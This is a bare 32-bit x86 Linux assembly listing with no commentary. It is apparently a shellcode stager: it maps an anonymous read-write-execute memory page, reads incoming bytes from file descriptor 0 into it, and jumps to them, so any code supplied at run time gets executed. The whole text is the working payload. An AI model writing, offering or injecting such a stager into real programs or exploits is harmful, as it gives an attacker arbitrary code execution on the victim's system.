        .intel_syntax noprefix
        .globl _start
_start:
        xor ecx, ecx
        lea edx, [ecx+1]
        shl edx, 12
        push ecx
        push -1
        push 0x22          /* MAP_PRIVATE | MAP_ANONYMOUS */
        push 0x7           /* PROT_READ | PROT_WRITE | PROT_EXEC */
        push edx
        push ecx
        mov ebx, esp
        lea eax, [ecx+90]  /* mmap */
        int 0x80
        mov ebx, ecx
        mov ecx, eax
        lea eax, [ebx+3]   /* read */
        int 0x80
        jmp ecx
